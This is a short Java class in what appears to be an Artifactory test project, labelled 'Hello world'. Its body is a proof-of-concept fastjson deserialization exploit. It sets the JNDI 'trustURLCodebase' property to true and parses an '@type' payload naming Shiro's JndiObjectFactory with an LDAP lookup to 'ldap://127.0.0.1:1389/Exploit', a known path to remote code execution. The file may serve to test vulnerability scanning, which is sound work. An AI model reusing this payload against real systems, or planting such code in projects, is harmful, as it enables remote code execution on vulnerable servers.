package artifactory.test;

import com.alibaba.fastjson.JSON;

/**
 * Hello world!
 */
public class Multi3 {
    public static void main(String[] args) {
        System.out.println("Hello JFrog artifactory.");

        new Multi1();

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";

        JSON jsonObject = JSON.parseObject(payload);

        System.out.println(jsonObject);
    }
}
